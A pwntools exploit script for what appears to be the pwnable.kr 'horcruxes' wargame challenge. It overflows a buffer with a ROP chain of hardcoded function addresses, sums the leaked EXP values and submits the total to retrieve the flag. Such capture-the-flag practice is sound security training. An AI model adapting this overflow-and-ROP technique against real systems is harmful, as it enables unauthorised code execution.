from pwn import *
#context.log_level='debug'

n = remote('pwnable.kr', 9032)

func_A = 0x0809FE4B
func_B = 0x0809FE6A
func_C = 0x0809FE89
func_D = 0x0809FEA8
func_E = 0x0809FEC7
func_F = 0x0809FEE6
func_G = 0x0809FF05
ROPME = 0x0809FFFC

n.recvuntil('Menu:')
n.sendline('0')
n.recvuntil('earned? : ')

payload = b'A'*120      
payload += p32(func_A) 
payload += p32(func_B)
payload += p32(func_C)
payload += p32(func_D)
payload += p32(func_E)
payload += p32(func_F)
payload += p32(func_G)
payload += p32(ROPME)

n.sendline(payload)
total = 0

for i in range(0,7):
    n.recvuntil('EXP +')
    total += int(n.recvuntil(')')[:-1])
    log.info('total = ' + str(total))

n.recvuntil("Menu:")
n.sendline("0")
n.recvuntil("earned? : ")
n.sendline(str(total))

flag = str(n.recv())

log.info("flag is : "+flag)
